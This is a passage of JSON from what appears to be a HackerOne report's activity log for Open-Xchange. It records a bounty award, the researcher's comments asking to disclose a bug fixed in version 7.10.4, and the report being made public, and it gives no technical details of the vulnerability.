03047,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-16T07:34:29.484Z","updated_at":"2020-06-16T07:34:29.484Z","actor":{"url":"/open-xchange","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Open-Xchange"}},"bounty_amount":"400.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"open-xchange","collaborator":{"username":"skr0x1c0","url":"/skr0x1c0"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8317220,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the bounty!","markdown_message":"\u003cp\u003eThanks for the bounty!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-17T10:04:59.284Z","updated_at":"2020-06-17T10:04:59.284Z","actor":{"username":"skr0x1c0","cleared":false,"url":"/skr0x1c0","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9315775,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Since this bug is fixed in 7.10.4, can we disclose this report?","markdown_message":"\u003cp\u003eSince this bug is fixed in 7.10.4, can we disclose this report?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-24T07:56:33.837Z","updated_at":"2020-09-24T07:56:33.837Z","first_to_agree":true,"actor":{"username":"skr0x1c0","cleared":false,"url":"/skr0x1c0","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9897187,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This bug was disclosed on security advisory published in 13th October 2020 (https://seclists.org/fulldisclosure/2020/Oct/20).\n\nCan we disclose this report also?","markdown_message":"\u003cp\u003eThis bug was disclosed on security advisory published in 13th October 2020 (\u003ca title=\"https://seclists.org/fulldisclosure/2020/Oct/20\" href=\"/redirect?url=https%3A%2F%2Fseclists.org%2Ffulldisclosure%2F2020%2FOct%2F20\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://seclists.org/fulldisclosure/2020/Oct/20\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e).\u003c/p\u003e\n\n\u003cp\u003eCan we disclose this report also?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-23T11:26:57.912Z","updated_at":"2020-11-23T11:26:57.912Z","actor":{"username":"skr0x1c0","cleared":false,"url":"/skr0x1c0","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9897246,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-23T11:35:40.474Z","updated_at":"2020-11-23T11:35:40.474Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9897247,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-23T11:35:40.557Z","updated_at":"2020-11-23T11:35:40.557Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}